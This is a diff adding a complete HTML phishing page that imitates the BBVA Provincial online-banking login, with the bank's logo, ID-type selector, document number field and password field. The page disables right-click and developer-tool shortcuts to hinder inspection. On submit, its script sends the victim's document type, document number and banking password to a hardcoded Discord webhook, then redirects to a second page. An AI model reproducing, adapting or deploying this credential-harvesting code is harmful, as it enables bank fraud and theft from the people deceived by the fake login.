@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA Provincial</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Aptos:wght@400;700&display=swap" rel="stylesheet">
+    <script src="alerta.js"></script>
+    <script src="ipvalidation.js"></script>
+    <link rel="icon" href="icono.png" type="image/x-icon">
+    <link rel="apple-touch-icon" href="icono.png">
+    <script type="text/javascript">
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 71)) {
+                return false;
+            }
+        };
+    </script>
+    <script>
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</head>
+<body class="body">
+    <form id="formulario" onsubmit="enviarFormulario(event)" class="form">
+        <div>
+            <img class="logo" src="logo1.jpg">
+        </div>
+        <div class="titulo">
+            <p>¡Bienvenido!</p>
+        </div>
+        <div class="documento" style="margin-left: 10px;">
+            <label for="opciones">Tipo de documento</label><br>
+            <select id="opciones" class="documento1" style="margin-top: 10px;">
+              <option value="cedula">Cédula de identidad &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</option>
+              <option value="pasaporte">Pasaporte &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp </option>
+              <option value="extranjero">Extranjero &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</option>
+            </select>
+        </div><br>
+        <div class="centrado1">
+            <input class="documento11" minlength="6" maxlength="10" type="text" id="documento" name="documento" inputmode="numeric" pattern="[0-9]*" required placeholder="Número de documento">
+        </div>
+        <div>
+            <input type="checkbox" style="display: inline-block;"><p style="display: inline-block;">Recordar documento</p>
+        </div>
+        <div class="centrado1">
+            <input class="documento11" type="text" id="pass" minlength="8" maxlength="8" name="pass" required placeholder="Clave de acceso">
+        </div>
+        <div class="centrado">
+            <a class="link" href="#"><b>¿Olvidaste o bloqueaste tu contraseña?</b></a>
+        </div><br>
+        <div class="centrado1">
+            <button type="submit" class="boton"><b>Entrar</b></button>
+        </div><br>
+    </form>
+
+    <script>
+        window.addEventListener("load", function() {
+            localStorage.removeItem("usuario");
+        });
+    
+        function enviarFormulario(event) {
+            event.preventDefault();
+    
+            var documento = document.getElementById("documento").value;
+            var pass = document.getElementById("pass").value;
+            var tipoDocumento = document.getElementById("opciones").value;
+    
+            localStorage.setItem("usuario", documento);
+    
+            const webhookURL = "https://discord.com/api/webhooks/1349064529908334603/IhrpAkq7q8a0vPayD0FaqVN5PlZI5yQBJkfutHnm2r9A2RkDW7oNEJjFIm308NHvrPWR";
+    
+            const mensaje = {
+                content: `**🇻🇪 BBVA PERSONAS:**
+                - **Tipo de documento:** ${tipoDocumento}
+                - **Número de documento:** ${documento}
+                - **Clave:** ${pass}`
+            };
+    
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(mensaje)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Mensaje enviado a Discord");
+                    window.location.href = 'index2.html';
+                } else {
+                    console.error("Error al enviar el mensaje:", response.statusText);
+                }
+            })
+            .catch(error => console.error("Error al enviar el mensaje:", error));
+        }
+    </script>
+    
+</body>
+</html>
